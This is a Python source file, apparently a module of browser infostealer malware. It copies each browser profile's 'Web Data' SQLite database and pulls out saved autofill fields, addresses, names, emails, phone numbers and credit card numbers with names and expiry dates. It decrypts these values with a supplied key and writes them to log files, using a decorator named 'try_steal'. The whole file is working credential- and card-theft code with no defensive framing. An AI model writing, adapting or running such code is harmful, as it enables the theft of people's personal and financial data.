""" IMPORTS """
import json
import sqlite3
from util import try_steal, get_profiles, create_temp_file, log_data, try_decrypt


"""
Tables of interest from SQLi Recon:
- autofill: contains all the fields and corresponding values
    - Columns of interest: name, value
- autofill_profiles: contains profiles of addresses
    - Columns of interest: company_name, street_address, city, state, zipcode, country_code
- autofill_profile_addresses: same as above, although probably unused
    - Columns of interest: street_address, city, state, zip_code, country_code
- autofill_profile_names: contains titles and names
    - Columns of interest: honorific_prefix, full_name
- autofill_profile_emails: contains email addresses
    - Columns of interest: email
- autofill_profile_phones: contains phone numbers
    - Columns of interest: number
- credit_cards: contains encrypted credit card info
    - Columns of interest: card_number_encrypted, name_on_card, expiration_month, expiration_year
"""


def autofill_stealer(browser: dict, encryption_key: str) -> None:
    """ Steals autofill data from a browser and places them into the logs directory """
    # Examine each profile
    profile_names = get_profiles(browser)
    for profile_name in profile_names:
        # Copy original sqlite3 database to access it without killing any active Chrome processes
        db_path = create_temp_file(browser, profile_name, 'Web Data')

        # Access sqlite3 database
        db_connection = sqlite3.connect(db_path)
        cursor = db_connection.cursor()

        # Extract autofill data from multiple tables
        extract_autofill(browser['name'], profile_name, encryption_key, cursor)
        extract_autofill_profiles(browser['name'], profile_name, encryption_key, cursor)
        extract_autofill_addresses(browser['name'], profile_name, encryption_key, cursor)
        extract_autofill_names(browser['name'], profile_name, encryption_key, cursor)
        extract_autofill_emails(browser['name'], profile_name, encryption_key, cursor)
        extract_autofill_phones(browser['name'], profile_name, encryption_key, cursor)

        # Extract credit card details
        extract_credit_cards(browser['name'], profile_name, encryption_key, cursor)

        # Close sqlite3 connection
        cursor.close()
        db_connection.close()



@try_steal
def extract_autofill(browser_name: str, profile_name: str, encryption_key: str, db_cursor) -> None:
    """ Extracts data from the autofill table and places them into the logs directory """
    # Query data
    db_cursor.execute('SELECT name, value FROM autofill')

    # Process data
    data = [
        {
            'field': try_decrypt(name, encryption_key),
            'value': try_decrypt(value, encryption_key),
        }
        for name, value in db_cursor.fetchall()
    ]

    # Log data
    if data:
        log_file_name = profile_name + ' Autofill Fields'
        log_data(data, browser_name, log_file_name)


@try_steal
def extract_autofill_profiles(browser_name: str, profile_name: str, encryption_key: str, db_cursor) -> None:
    """ Extracts data from the autofill_profiles table and places them into the logs directory """
    # Query data
    query = 'SELECT company_name, street_address, city, state, zipcode, country_code FROM autofill_profiles'
    db_cursor.execute(query)

    # Process data
    data = [
        {
            'company_name': try_decrypt(company_name, encryption_key),
            'street_address': try_decrypt(street_address, encryption_key),
            'city': try_decrypt(city, encryption_key),
            'state': try_decrypt(state, encryption_key),
            'zipcode': try_decrypt(zipcode, encryption_key),
            'country_code': try_decrypt(country_code, encryption_key),
        }
        for company_name, street_address, city, state, zipcode, country_code in db_cursor.fetchall()
    ]

    # Log data
    if data:
        log_file_name = profile_name + ' Autofill Profiles'
        log_data(data, browser_name, log_file_name)


@try_steal
def extract_autofill_addresses(browser_name: str, profile_name: str, encryption_key: str, db_cursor) -> None:
    """ Extracts data from the autofill_profile_addresses table and places them into the logs directory """
    # Query data
    query = 'SELECT street_address, city, state, zip_code, country_code FROM autofill_profile_addresses'
    db_cursor.execute(query)

    # Process data
    data = [
        {
            'street_address': try_decrypt(street_address, encryption_key),
            'city': try_decrypt(city, encryption_key),
            'state': try_decrypt(state, encryption_key),
            'zip_code': try_decrypt(zip_code, encryption_key),
            'country_code': try_decrypt(country_code, encryption_key),
        }
        for street_address, city, state, zip_code, country_code in db_cursor.fetchall()
    ]

    # Log data
    if data:
        log_file_name = profile_name + ' Autofill Addresses'
        log_data(data, browser_name, log_file_name)


@try_steal
def extract_autofill_names(browser_name: str, profile_name: str, encryption_key: str, db_cursor) -> None:
    """ Extracts data from the autofill_profile_names table and places them into the logs directory """
    # Query full name data
    db_cursor.execute('SELECT full_name FROM autofill_profile_names')
    names = [try_decrypt(row[0], encryption_key) for row in db_cursor.fetchall()]

    # Extract titles if possible
    titles = [''] * len(names)
    try:
        db_cursor.execute('SELECT honorific_prefix FROM autofill_profile_names')
        titles = [try_decrypt(row[0], encryption_key) for row in db_cursor.fetchall()]
    except sqlite3.OperationalError:
        # ignore title if unable to extract any
        pass

    # Process data
    data = set()
    assert len(titles) == len(names)
    for title, full_name in zip(titles, names):
        # ignore title or full_name if None
        name = (title or '') + (full_name or '')
        if name:
            data.add(name)

    # Log data
    if data:
        log_file_name = profile_name + ' Autofill Names'
        log_data(list(data), browser_name, log_file_name)


@try_steal
def extract_autofill_emails(browser_name: str, profile_name: str, encryption_key: str, db_cursor) -> None:
    """ Extracts data from the autofill_profile_emails table and places them into the logs directory """
    # Query data
    db_cursor.execute('SELECT email FROM autofill_profile_emails')

    # Process data
    data = [try_decrypt(row[0], encryption_key) for row in db_cursor.fetchall()]
    data = [email for email in set(data) if email]

    # Log data
    if data:
        log_file_name = profile_name + ' Autofill Emails'
        log_data(data, browser_name, log_file_name)


@try_steal
def extract_autofill_phones(browser_name: str, profile_name: str, encryption_key: str, db_cursor) -> None:
    """ Extracts data from the autofill_profile_phones table and places them into the logs directory """
    # Query data
    db_cursor.execute('SELECT number FROM autofill_profile_phones')

    # Process data
    data = [try_decrypt(row[0], encryption_key) for row in db_cursor.fetchall()]
    data = [number for number in set(data) if number]

    # Log data
    if data:
        log_file_name = profile_name + ' Autofill Phones'
        log_data(data, browser_name, log_file_name)


@try_steal
def extract_credit_cards(browser_name: str, profile_name: str, encryption_key: str, db_cursor) -> None:
    """ Extracts data from the credit_cards table and places them into the logs directory """
    # Query data
    query = 'SELECT card_number_encrypted, name_on_card, expiration_month, expiration_year FROM credit_cards'
    db_cursor.execute(query)

    # Process data
    data = [
        {
            'card_number': try_decrypt(encrypted_card_number, encryption_key),
            'name_on_card': try_decrypt(name, encryption_key),
            'expiration_month': try_decrypt(expr_month, encryption_key),
            'expiration_year': try_decrypt(expr_year, encryption_key),
        }
        for encrypted_card_number, name, expr_month, expr_year in db_cursor.fetchall()
    ]

    # Log data
    if data:
        log_file_name = profile_name + ' Credit Cards'
        log_data(data, browser_name, log_file_name)



def sqli_recon(db_cursor) -> None:
    """ SQL queries to learn more about the database structure """
    # To find tables
    db_cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
    print(db_cursor.fetchall())
    tables_of_interest = [
        'autofill',
        'autofill_profiles',
        'autofill_profile_addresses',
        'autofill_profile_names',
        'autofill_profile_emails',
        'autofill_profile_phones',
        'credit_cards'
    ]

    # To find columns for tables of interest
    for table in tables_of_interest:
        db_cursor.execute(f'PRAGMA table_info({table})')
        print([row[1] for row in db_cursor.fetchall()])
        # Columns of interest described at beginning of file
